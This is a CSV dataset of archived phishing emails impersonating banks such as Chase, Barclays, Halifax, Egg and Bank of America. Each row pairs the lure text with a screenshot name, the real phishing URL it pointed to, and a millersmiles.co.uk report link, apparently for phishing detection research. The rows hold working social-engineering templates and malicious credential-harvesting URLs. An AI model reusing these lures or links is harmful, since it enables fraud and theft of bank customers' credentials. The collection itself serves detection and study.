email_text,screenshot,URL,Details_Link
"﻿

<br />

CHASE<br />

Note: This is a service message regarding the Chase Customer Form.<br />

Dear customer:<br />

As part of the new security measures, all Chase bank customers are required to complete Chase Customer Form. Please complete the form as soon as possible.<br />

To access the form please click on the following link:<br />

http://chaseonline.chase.com/Secure/webform/OSL.aspx?LOB†147769481611989610907381586363656867568548381323018755838383<br />

Thank you for being a valued customer.<br />

Sincerely,<br />

Chase Customer Service<br />

Please don&#039;t reply to this Alert.<br />

millersmiles.co.uk Phishing scam report",11.png,http://chaseonline.chase.com.iljihli.com.mx/Secure /webform/OSL.aspx?LOB�1477694816119896109073815863 63656867568548381323018755838383,http://www.millersmiles.co.uk/email/important-account-notice-from-chase-bank-jpmorgan-chase-bank-noreplyc
"﻿

<br />

BARCLAYS<br />

Dear Customer,<br />

Important Notice<br />

Our technical service department has recently updated our online banking security, and due to security upgrade we kindly ask you to follow the reference given below to confirm your membership details. Failure to confirm your membership details your account access maybe limited.<br />

Reference<br />

https://ibank.barclays.co.uk/olb/p/LoginMember.do/confirm<br />

Regards,<br />

Barclays Bank<br />

Customer Service.<br />

View your Twitter and Flickr updates from one place - Learn more!<br />

millersmiles.co.uk<br />

Phishing scam report",12.png,http://cafeds.pluzhost.org/claysupdatfe/olb/t/Logi nMember.do/index.htm,http://www.millersmiles.co.uk/email/customer-account-profile-alert-barclays
"﻿

<br />

WELLS FARGO<br />

Our Valued Customer,<br />

Your Account Access Is On Red Alert<br />

We are contacting you to remind you that our Account Review Team identified some unusual activity in your account. In accordance with Wellsfargo Bank User Agreement and to ensure that your account has not been accessed from fraudulent locations, access to your account has been limited. Your account access will remain limited until this issue has been resolved please log in your account or click on the link bellow:<br />

Click Here To Start<br />

Wellsfargo Bank, N.A. and its affiliates.<br />

Windows LiveTM SkyDriveTM: Get 25 GB of free online storage. Get it on your BlackBerry or iPhone.<br />

millersmiles.co.uk Phishing scam report",13.png,http://www.dksb.de/cache/apache/chy/wellsfargo-onl ine.php,http://www.millersmiles.co.uk/email/account-status-notification-from-wells-fargo-internet-wellsfargo
"﻿

<br />

A M&amp;T Bank<br />

Reference Number: 01657686118278284<br />

Dear M&amp;T Bank customer,<br />

As part of the new security measures, all M&amp;T bank customers are required to complete M&amp;T Customer Form. Please complete the form as soon as possible.<br />

To access the form please click on the following link:<br />

CLICK HERE TO START<br />

Thank you for banking with us.<br />

Sincerely,<br />

M&amp;T Customer Service<br />

Please do not reply to this e-mail.<br />

© MTB 2009<br />

millersmiles.co.uk<br />

Phishing scam report",14.png,http://www.smartox.fr/0grade.mandtline.mtb.com/onl inebanking.MTB.com/SignOn.aspx/index.html,http://www.millersmiles.co.uk/email/security-alert-mtb-online
"﻿

<br />

BARCLAYS<br />

In order to make your online experience even more secure we have introduced a new security feature that allows us to detect unusual activity on your online account.<br />

UPDATE YOUR ONLINE ACCOUNT... Barclays Online Banking<br />

Barclays National Security Department<br />

View your Twitter and Flickr updates from one place - Learn more!<br />

millersmiles.co.uk<br />

Phishing scam report",15.png,http://banekrsrenas.hoxt.me/barclays.co.uk/index.h tm,http://www.millersmiles.co.uk/email/update-your-online-account-barclays
"﻿

<br />

MBNA<br />

EUROPE<br />

Dear Customer<br />

We&#039;re making some exciting changes that will make your online banking experience even better, We therefore request you to verify your location.<br />

MBNA Online Access Verification<br />

Please note that Your MBNA Online Banking has been flagged by our system and all flagged account required verification<br />

for Online Banking to remain active due to recent changes we have made to our online banking system.<br />

This verification will allow us to activate new features for your account on our system and to protect your account fully against ID Theft. We have made these changes to ensure only You have access and use your MBNA Account&#039;s.<br />

Please click the link below to proceed with verification process.<br />

www.mbna.ie/aboutonline/verifyownership.stml<br />

It is all about your security.<br />

Best wishes Mark Banks<br />

Head of Online<br />

millersmiles.co.uk<br />

Phishing scam report",16.png,http://www.tshirtprintinginlondon.com/mbn/LoginPro cess.htm,http://www.millersmiles.co.uk/email/update-your-online-account-mbna-bank-plc
"﻿

<br />

Commonwealth Bank<br />

Dear Commonwealth Bank member,<br />

We recently reviewed your account, and we are suspecting that your NetBank account may have been accessed from an unauthorized computer.<br />

This may be due to changes in your IP address or location. Protecting the security of your account and of the Commonwealth Bank network is our primary concern.<br />

We are asking you to immediately login and report any unauthorized withdrawals, and check your account profile to make sure no changes have been made.<br />

Please click on the following link, to update your NetBank account:<br />

https://www.commbank.com.au/netbank/bankmain<br />

We apologize for any inconvenience this may cause, and appreciate your support in helping us maintaining the integrity of the entire Commonwealth Bank system.<br />

Please login as soon as possible.<br />

Thank you,<br />

Commonwealth Bank Customer Service.<br />

millersmiles.co.uk<br />

Phishing scam report",17.png,http://cpe00147cadbaa1-cm0012254183b0.cpe.net.cabl e.rogers.com/m.html,http://www.millersmiles.co.uk/email/netbank-account-reactivation-commonwealth-bank
"﻿

<br />

Abbey<br />

PART OF THE SANTANDER GROUP<br />

Dear Customer,<br />

To protect your accounts, our monitoring process has temporarily suspended your online access. This had been done due to the number of incorrect login attempts.<br />

At Abbey Bank, we take the job of protecting our customers very seriously, so for your protection we are proactively notifying you of this activity.<br />

Due to this, You are requested to follow the provided steps in order .To restore your online access please click on the link below.<br />

https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/Logon?action=prepare<br />

We apologise for any inconvenience caused by this action. Thank you for Banking with Abbey Online Banking<br />

millersmiles.co.uk<br />

Phishing scam report",18.png,http://fayz.ru/templates/.onlineisa/index.html,http://www.millersmiles.co.uk/email/abbey-alert--online-banking-access-abbey-bank
"﻿

<br />

Account<br />

mbna<br />

Dear Customer,<br />

You Have One Unread Message<br />

On Your Online Banking Account<br />

VIEW YOUR MESSAGE<br />

Thanks.<br />

MBNA Bank.<br />

millersmiles.co.uk Phishing scam report",19.png,http://www.steelwork.ru/www.mbna.ie.html,http://www.millersmiles.co.uk/email/you-have-one-unread-message-on-your-online-banking-account-mbna-bank
"﻿

<br />

Information<br />

Bank of America<br />

Your Online Banking is Blocked<br />

Dear Bank of America Customer,<br />

We&#039;ve noticed that you didn&#039;t completed the verfication request,<br />

Please login below and complete the cerification steps, if you don&#039;t complete this verification in 3 days, we will have to close your account. We modified the cerification questions, since we have the most of the information already.<br />

To verify your identity please follow the link and sign in: https://onlineid.bankofamerica.com/cgi-bin/sso.updatecontroller<br />

Sincerely, BankofAmerica &amp; Co.<br />

Online Customer Service<br />

Bank of America, NA. Member FDIC. Equal Housing Lender ©2009 Bank of America Corporation. All rights reserved.<br />

millersmiles.co.uk<br />

Phishing scam report",20.png,http://timwilliams.biz/rss/BankofAmerica/,http://www.millersmiles.co.uk/email/bank-of-america-alert-update-your-account-information-bank-of-america-alert
"﻿

<br />

open all hours<br />

egg<br />

TM<br />

This is to inform you that your Egg Bank Secure Messages Center has<br />

1 new message.<br />

To access your Egg Banking personalized Secure Messages Center, click on the image below:<br />

Account Reference: (0x3d.0x38.0x4.0xcf)<br />

Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistence, log in to your Egg Online account and click the Help link located in the top right corner of any Egg Online page. This email (including any attachments) is intended for the above-mentioned person(s). If you are not the intended recipient of this email, please delete this email immediately. It is private and confidential and may contain legally privileged<br />

information.<br />

Beyond Hotmail - see what else you can do with Windows Live. Find out more.<br />

millersmiles.co.uk<br />

Phishing scam report",21.png,http://202.28.50.11/cse/Egg.html,http://www.millersmiles.co.uk/email/message1-new-message-egg
"﻿

<br />

show New details<br />

Egg 9:56 Bank AM (1<br />

Tm hour<br />

ago)<br />

Â<br />

Â Your Account has been placed under 24 hour surveillance. This isbecause Someone has tried to log into your account with an incorrectdetail at least 5 times. This person has been prevented from attempting to login to your account for the next 15 minutes. You are required to verify your Reply account details as soon as possible<br />

failure to do this would lead to your account being locked Click here to see all your accounts<br />

Reply Forward<br />

Dell Laptops: Huge Savings on Popular Laptops - Deals starting at $399<br />

millersmiles.co.uk Phishing scam report",22.png,http://www.dancingbeach.ch/your.egg.com/security/c ustomer/youraccounts.html,http://www.millersmiles.co.uk/email/your-account-has-been-placed-under-24-hour-surveillance-new-egg-bank-tm
"﻿

<br />

Abbey<br />

PART OF THE SANTANDER GROUP<br />

millersmiles.co.uk<br />

Phishing scam report<br />

Dear customer,<br />

This is to notify you, that your online banking Access is not activate; because of the Error Code between your online baking Access.<br />

We are unable to send message(s) to state down your online banking statement due to a Error Code [E6343#] between your online banking Access and your e-mail address.<br />

Log on to Re-confirm your account<br />

status.<br />

[www.abbey.com]<br />

Important Notice:- You are strictly advised to match your details<br />

correctly to avoid service suspension.<br />

Thank You.<br />

Abbey Internet Banking Customer Services<br />

Copyright(c) 2009 Abbey<br />

Online Banking Security Dept.",23.png,http://www.nivaira.com/images/rss/2/myonlineaccoun ts2.abbeynational.co.uk/Logon.htm,http://www.millersmiles.co.uk/email/multiple-attempt-login-abbey-national-plc
"﻿

<br />

Dear valued Egg Bank Member,<br />

As part of our security measures, we regularly screen activities<br />

in Egg Bank system,we recently detect a problem<br />

on your account,Because unusual number of invalid login attempts on<br />

your account, We noticed that their might be some security problem<br />

on your account. We have decided to put an extra verification<br />

process to ensure your identity and your account are secured.<br />

Please follow the instructions as follows by clicking on the link<br />

below, failure to do so will result to your account<br />

restriction and<br />

use of your online banking. https://new.egg.com/security/customer/logon?URI=2<br />

Thanks for your co-operation.<br />

Issued for UK use only | Egg Bank PLC 2009 ·<br />

millersmiles.co.uk<br />

Phishing scam report",24.png,http://www.clmkonsult.se/media/www.new.egg.com/egg bank/security/customer/logon/URI/new.egg.com/custo mer/youraccounts/EggSecurityLogin.htm,http://www.millersmiles.co.uk/email/egg-accounts-management-department-alert-egg-accounts-management-depart
"﻿

<br />

flagged.<br />

HALIFAX<br />

a little extra help<br />

You have 1 new Alert Message!<br />

Resolution Center: Your account has been flagged Click to Resolve<br />

millersmiles.co.uk<br />

Phishing scam report",25.png,http://www.cabinet-energia.fr/upload_cv/halifax-on line.co.uk.1.php,http://www.millersmiles.co.uk/email/your-account-has-been-flagged-halifax-bank-plc
"﻿

<br />

Bank of America.<br />

SM<br />

Your Online Banking is Blocked<br />

Because of unusual number of invalid login attempts on you account, we had to believe that, their might be some security problem on you account. So we have decided to put an extra verification process to ensure your identity and your account security. Please click on sign in to Online Banking to continue to the verification process and ensure your account security. It is all about your security. Thank you, and visit the customer service section.<br />

Want to get more alerts? Sign in to Bank of America Online Banking and click the &quot;Manage Alerts&quot; link in the &quot;I want to...&quot; box.<br />

This alert is sent automatically. If you would like to make any changes to your Online Banking Alerts service, please sign in to Online Banking and click on the Customer Service Tab. The security and confidentiality of your personal information is important to us.<br />

BECAUSE E-MAIL IS NOT A SECURE FORM OF COMMUNICATION, THIS E-MAIL BOX IS NOT EQUIPPED TO HANDLE REPLIES.<br />

If you are a Bank of America customer and have sensitive account-related questions, please call the phone number provided on your account statement or the appropriate phone number indicated in the following &quot;Contact Us&quot; link so we can properly verify your identity. For all other questions or comments, please use the Web forms available via Contact Us. We respect your privacy, and you can rest assured that we protect your information, including your email address, and will never sell or share it with marketers outside Bank of America. To find out more, please read our Privacy Policy. Bank of America E-mail, 6th Floor, 101 North Tryon Street, Charlotte, NC 28255-0001<br />

Bank of America, N.A. Member FDIC. Equal Housing Lender<br />

? 2009 Bank of America Corporation. All rights reserved<br />

millersmiles.co.uk<br />

Phishing scam report<br />

Official Sponsor 2004-2008<br />

U.S. Olympic Teams<br />

USA",26.png,http://mail.jcecable.com.cn/data/openwebmail/www.b ankofamerica.com/index.html,http://www.millersmiles.co.uk/email/your-online-banking-is-blocked-bank-of-america-alert
"﻿

<br />

You have 1 new security ALERT message.<br />

To continue, please LOG ON to your NetBank account and follow the steps.<br />

The information you provide us is all non-sensitive and anonymous - No part of it is handed down to any third party. Thank you for using Commonwealth Bank.<br />

© Commonwealth Bank of Australia 2009 ABN 48 123 123 124<br />

millersmiles.co.uk Phishing scam report",27.png,http://static-71-98-249-44.tampfl.dsl-w.verizon.ne t/logon.php,http://www.millersmiles.co.uk/email/a-new-statement-is-available-in-netbank-commonwealth-bank-online-9663
"﻿

<br />

Access Account Has Been Blocked. Importance: High<br />

Santander<br />

Alliance Leicester<br />

Dear Valued Customer,<br />

We recently have determined that different computers have logged into your Alliance &amp; Leicester account, and multiple password failures were present before the logons.<br />

In this manner for your security, your specified access account has been locked and needs to be reactivated, in order for it to remain active, please Use the link below to proceed and unlock your account.<br />

So we want you to use this oppurtunity to upgrade your account to our new security with the Santander Group, one of the largest banks in the world by market capitalisation.<br />

https://www.mybank.alliance leicester.co.uk/index.asp?ct=mybankrhnlogin&amp;<br />

By becoming part of the Santander Group, Alliance &amp; Leicester has acquired strong backing, which is crucial in these difficult financial times.<br />

I am convinced that Abbey, Alliance &amp; Leicester and Bradford &amp; Bingley, as part of the Santander Group, will be a leading UK bank focused on giving you great service and value for money products.<br />

Yours sincerely,<br />

Chairman, Emilio Botin<br />

Alliance &amp; Leicester is now part of the Santander Group, one of the largest banks in the world by market capitalisation.<br />

This message was sent to you as an Alliance &amp; Leicester customer, to inform you regarding important information about your account.<br />

Please do not reply to this email. It has been sent from an email address that does not accept incoming emails. To contact us, please telephone internet banking on 0844 800 11 44 or textphone 0844 800 50 50 or visit our website<br />

alliance-leicester.co.uk. Calls to 08++ numbers cost 6 pence plus 5 pence per minute from a BT Together landline. Mobile and other providers&#039; charges may vary. Calls are recorded and may be monitored for security, quality control and training purposes.<br />

As an additional security measure every customer email sent to you by<br />

Alliance &amp; Leicester Group will be addressed to you personally. Please report to suspiciousema...@alliance-leicester.co.uk any email which appears to come from Alliance &amp; Leicester but is NOT addressed to you personally.<br />

We will never ask you to supply personal information such as passwords or other security information via email. If you are ever asked to supply this information in any email which appears to come from Alliance &amp; Leicester, please report this to suspiciousemails@alliance leicester.co.uk.<br />

This email has been sent by Alliance &amp; Leicester plc. Registered Office: Carlton Park, Narborough, Leicester LE19 OAL. Company No. 3263713. Registered in England. Alliance &amp; Leicester plc is authorised and regulated by the Financial Services Authority. Our FSA register number is 189099.<br />

millersmiles.co.uk Phishing scam report",28.png,http://www.juarteakorea.co.kr/image/main/juar.inde x.php,http://www.millersmiles.co.uk/email/customer-notice-access-account-has-been-blocked-alliance--leicester-plc
"﻿

<br />

If you can not read this message.. Click here<br />

Message sent via TelecomPlusMail - http://webmail.go-plus.net/<br />

millersmiles.co.uk Phishing scam report",29.png,http://fanmusik.com/site/1/ax/halifax67halifax12ha lifax67halifax.htm,http://www.millersmiles.co.uk/email/fwd-online-access-suspended-halifax-plc
"﻿

<br />

HALIFAX<br />

a little extra help<br />

We have detected a slight error in your contact information.<br />

This might be due to either of the following reasons:<br />

1. A recent updates in our billing server (Due to slightly problem)<br />

2. A recent change in your personal information (i.e. change of Question). Please update and verify your information by clicking the Secure VP below: VERIFICATION PROCESS<br />

f your account information is not updated within 48 hours then your ability to access your account will become restricted.<br />

Thank you<br />

Halifax Technical Security Team.<br />

millersmiles.co.uk<br />

Phishing scam report",30.png,http://johngordonross.com/wp-content/plugins/globa l-translator/halifaxcouk_page_login_simigvis.php,http://www.millersmiles.co.uk/email/online-banking-alert-notice-many-error-login-attempts-your-halifax-bank-plc-9769
"﻿

<br />

Verification Required)<br />

Dear Esteemed Customer,<br />

This is an important Barclays bank security Message.<br />

We Recently reveived your account, and suspected that your Barclays Ibanking Account,<br />

may have been violated from another IP.<br />

Protecting the security of your account and of the barclays bank network is our primary concem therefore,<br />

as a preventive measure, we have temporarily limited your access to sensitive account features.<br />

To restore your account access, please take the following step to ensure that your account has not been compromised.<br />

1,Login to your barclays bank internet banking acconut.<br />

and you will have to fill in all required information.<br />

2 Reveiw your recent account history for any unautorized withdrawers or deposites,<br />

and check your account profile to make sure no changes was made.<br />

If any unauthorized activities has been made,report to any barclay bank close to you.<br />

log in<br />

Kind regards, Barclays Bank Plc<br />

millersmiles.co.uk<br />

Phishing scam report",31.png,http://www.kremel.cz/LoginMember.done.php,http://www.millersmiles.co.uk/email/your-barclays-ibanking-account-has-been-violatedsecurity-barclays-bank-plc
"﻿

<br />

HALIFAX<br />

a little extra help<br />

Our Value Customer, unfortunately your access has been suspended.<br />

To ensure your protection, we&#039;ve now suspend access to your accounts due to a miss-match of access code between your<br />

Security details. You now need to verify your Identity. You won&#039;t be able to gain access to your accounts until you&#039;ve done this.<br />

To verify your Identity, please click on the guide-link below and follow the directions to instant activation. Carefully assign<br />

your details as they are securely encrypted. This would take less than five<br />

minutes.<br />

https://halifax-online.co.uk/_mem_bin/customer/formslogin.asp<br />

Important Notice:- You are advised to match your details correctly to avoid service denial.<br />

Yours Sincerely,<br />

Halifax Online Banking Customer Service<br />

Halifax is a division of Bank of Scotland plc. Registered in Scotland No. SC327000. Registered Office: The Mound, Edinburgh, EHI 1Y2.<br />

millersmiles.co.uk<br />

Phishing scam report",32.png,http://www.dbwoluwe.be/_mem_bin/formslogin.asp/ind ex.php,http://www.millersmiles.co.uk/email/access-suspended-halifax-online-banking
"﻿

<br />

To ensure delivery to your inbox, please add USAA.Web.Services@customermail.usaa.com to your address book.<br />

Confirmation Form<br />

USAA<br />

Online Security Guarantee<br />

Dear USAA Customer,<br />

We would like to inform you that we have released a new version of USAA Confirmation Form. This form is required to be completed by all USAA customers. Please use the button below in order to access the form:<br />

Access USAA Confrmation Form<br />

Thank you, USAA<br />

Please do not reply to this e-mail. To send a secure message to USAA, please contact us.<br />

Privacy Promise<br />

USAA, 9800 Fredericksburg Road, San Antonio, Texas 78288<br />

USAA means United Services Automobile Association and its insurance, banking, investment and other companies. Banks Member FDIC. Investments provided by USAA Investment Management Company and USAA Financial Advisors Inc., both registered broker dealers.<br />

millersmiles.co.uk<br />

Phishing scam report<br />

66661-1208",33.png,http://www.usaa.com.mrtll.com.mx/inet/ent_formvers ionnew/do_action?idp164578545227892759079334015154 1737148633857475974,http://www.millersmiles.co.uk/email/usaa-important-announce-usaa-noreplyusaacom
"﻿

<br />

Abbey<br />

Dear Abbey Customers,<br />

IMPORTANT MESSAGE PLEASE READ Over the coming days, you will be asked to update or confirm your contact details after you logon to Abbey.com.<br />

It is important we have the most up to date contact details for you, so if there is a problem with your account, or a transaction that we need to confirm<br />

we can be in contact as quickly as possible.<br />

Please follow the below link to update your telephone number and email address.<br />

Continue To Online Banking<br />

Accounts Management As outlined in our User Agreement, Abbeywillperiodically send you information about site changes and enhancements.<br />

© 2009. Abbey National plc. All Rights Reserved. Read Our Privacy Policy<br />

millersmiles.co.uk Phishing scam report",34.png,http://www.dilysfronks.com/layouts/notes.php,http://www.millersmiles.co.uk/email/new-santander-online-banking-abbey-bank
"﻿

<br />

HALIFAX<br />

a little extra help<br />

Halifax Bank temporarily suspend your account. Reason: Billing failure. We Need you to complete an Account Update so we can Unlock Your Account<br />

To start the update Process Follow the Link Below:<br />

https://www.halifax-online.co.uk/_mem_bin/formslogin.asp?source=halifaxcouk simigvis<br />

Once you have completed the process, we will send you an email notification that your account is available For Used Under 24 Banking Hours!<br />

After that you can Access your account at anytime.<br />

The information provide will be treated In confidence and store in our secure database.<br />

If you fail to provide you required information your account will be automatically deleted from Halifax Bank Database.<br />

Thank you very much for your Co-Operation.<br />

Halifax Bank plc<br />

If you are not a UK resident, or are trying to access this site from outside the UK,please read this important message<br />

Halifax is a division of Bank of Scotland plc. Registered in Scotland No. SC327000. Registered Office: The Mound, Edinburgh, EH1 1YŻ.<br />

Safe &amp; secure<br />

Sign in with confidence<br />

Read about our latest security certificate<br />

millersmiles.co.uk Phishing scam report<br />

Read more",35.png,http://gadesko.de/oscommerce/catalog5/56512/online .html,http://www.millersmiles.co.uk/email/online-serviceimportant-security-information-online-service-9794
